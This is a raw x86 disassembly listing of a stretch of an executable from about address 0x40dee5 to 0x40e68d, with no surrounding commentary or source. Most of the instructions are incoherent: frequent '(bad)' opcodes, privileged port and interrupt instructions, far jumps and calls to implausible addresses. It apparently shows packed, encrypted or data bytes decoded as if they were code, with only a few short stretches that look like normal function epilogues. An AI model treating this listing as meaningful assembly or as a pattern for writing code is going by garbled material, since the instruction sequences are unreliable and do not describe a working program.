  40dee5:	scas   al,BYTE PTR es:[edi]
  40dee6:	das    
  40dee7:	sub    BYTE PTR [eax],bh
  40dee9:	mov    ds:0x45fbb8f4,al
  40deee:	xchg   ecx,eax
  40deef:	and    BYTE PTR ds:0x1eeffc7d,cl
  40def5:	push   ss
  40def6:	sub    al,0x83
  40def8:	sbb    eax,0x67ee75d2
  40defd:	imul   eax,DWORD PTR [edi],0x1029c34b
  40df03:	push   ebp
  40df04:	push   ebp
  40df05:	push   0xfffffff3
  40df07:	js     0x40dea7
  40df09:	push   0x16
  40df0b:	dec    edi
  40df0c:	sbb    DWORD PTR ds:0x3ec023be,esi
  40df12:	push   eax
  40df13:	dec    esi
  40df14:	in     eax,dx
  40df15:	popa   
  40df16:	xor    eax,0xf3a50b47
  40df1b:	sbb    edx,DWORD PTR [edi+0xc]
  40df1e:	sub    eax,0x73f37b3b
  40df23:	into   
  40df24:	add    al,BYTE PTR [esi+0x0]
  40df27:	xor    esp,DWORD PTR [ecx+0x5e14d856]
  40df2d:	out    dx,eax
  40df2e:	div    BYTE PTR [ecx-0x2a2b41dc]
  40df34:	cmp    ch,BYTE PTR [ebx+0x40e4dea6]
  40df3a:	fwait
  40df3b:	xchg   ebx,eax
  40df3c:	xchg   ecx,eax
  40df3d:	leave  
  40df3e:	xchg   ecx,eax
  40df3f:	(bad)  
  40df41:	sub    BYTE PTR [esi],ch
  40df43:	in     al,0xf7
  40df45:	mov    ebp,0x2b9e9bf7
  40df4a:	leave  
  40df4b:	sub    ebx,ebx
  40df4d:	sbb    DWORD PTR [ebx+0x50],ebx
  40df50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df51:	mov    ds:0xe203b3bc,al
  40df56:	sti    
  40df57:	iret   
  40df58:	jbe    0x40df7c
  40df5a:	or     DWORD PTR [esi+0x704f44e6],0xc49b900c
  40df64:	cmc    
  40df65:	add    dh,BYTE PTR [edx+ebx*8+0x2357d4c1]
  40df6c:	mov    cl,0xb5
  40df6e:	sbb    eax,0x1afedd2c
  40df73:	add    eax,0x38b9226d
  40df78:	icebp  
  40df79:	into   
  40df7a:	xchg   ebp,eax
  40df7b:	ins    BYTE PTR es:[edi],dx
  40df7c:	pextrw esi,(bad),0xc5
  40df7e:	jno    0x40df69
  40df80:	pop    eax
  40df81:	div    BYTE PTR [ebx+ecx*8-0x34]
  40df85:	cmp    ebx,DWORD PTR [edi+eiz*8]
  40df88:	jmp    0x40dffe
  40df8a:	lahf   
  40df8b:	call   0xbf9c:0x679d40ad
  40df92:	and    BYTE PTR [eax+0x4356a8fe],0xc1
  40df99:	pop    edi
  40df9a:	push   ebp
  40df9b:	xor    al,0x66
  40df9d:	(bad)  
  40df9e:	stc    
  40df9f:	lahf   
  40dfa0:	leave  
  40dfa1:	daa    
  40dfa2:	retf   
  40dfa3:	xlat   BYTE PTR ds:[ebx]
  40dfa4:	into   
  40dfa5:	stos   DWORD PTR es:[edi],eax
  40dfa6:	(bad)  
  40dfa7:	shl    DWORD PTR [ecx-0x49bd52fb],0x3b
  40dfae:	inc    edi
  40dfaf:	icebp  
  40dfb0:	dec    ebp
  40dfb1:	call   DWORD PTR [edx-0xa]
  40dfb4:	je     0x40e015
  40dfb6:	and    eax,0x8743e655
  40dfbb:	retf   
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
